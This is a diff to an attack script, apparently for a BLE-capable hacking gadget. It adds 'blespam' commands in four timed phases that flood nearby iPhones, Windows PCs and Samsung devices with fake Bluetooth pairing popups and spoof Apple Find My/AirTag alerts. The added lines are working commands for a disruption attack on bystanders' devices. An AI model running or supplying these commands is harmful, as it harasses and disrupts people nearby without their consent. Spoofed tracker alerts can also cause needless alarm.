@@ -75,6 +75,8 @@ PLATFORM MAC
 PLATFORM LINUX
   STRINGLN [Phase 1/4] iOS spam — {{PHASE_SEC}}s
 
+# iOS proximity-pair popups (blespam -t apple)
+WIFI_CMD blespam -t apple
 WIFI_WAIT {{PHASE_SEC}}000
 
 # ── Phase 2: Windows SwiftPair Spam ──────────────────────────────────────────
@@ -90,6 +92,9 @@ PLATFORM MAC
 PLATFORM LINUX
   STRINGLN [Phase 2/4] SwiftPair — {{PHASE_SEC}}s
 
+# Windows SwiftPair notifications (blespam -t windows)
+WIFI_STOP
+WIFI_CMD blespam -t windows
 WIFI_WAIT {{PHASE_SEC}}000
 
 # ── Phase 3: Samsung BLE Spam ─────────────────────────────────────────────────
@@ -105,6 +110,9 @@ PLATFORM MAC
 PLATFORM LINUX
   STRINGLN [Phase 3/4] Samsung — {{PHASE_SEC}}s
 
+# Samsung accessory pairing prompts (blespam -t samsung)
+WIFI_STOP
+WIFI_CMD blespam -t samsung
 WIFI_WAIT {{PHASE_SEC}}000
 
 # ── Phase 4: AirTag Spoof ─────────────────────────────────────────────────────
@@ -120,7 +128,12 @@ PLATFORM MAC
 PLATFORM LINUX
   STRINGLN [Phase 4/4] AirTag spoof — {{PHASE_SEC}}s
 
+# Apple Find My / AirTag-style alerts (blespam -t apple; a dedicated AirTag-spoof command is firmware-fork specific)
+WIFI_STOP
+WIFI_CMD blespam -t apple
 WIFI_WAIT {{PHASE_SEC}}000
+
+WIFI_STOP
 
 # ── Summary ───────────────────────────────────────────────────────────────────
 PLATFORM WIN
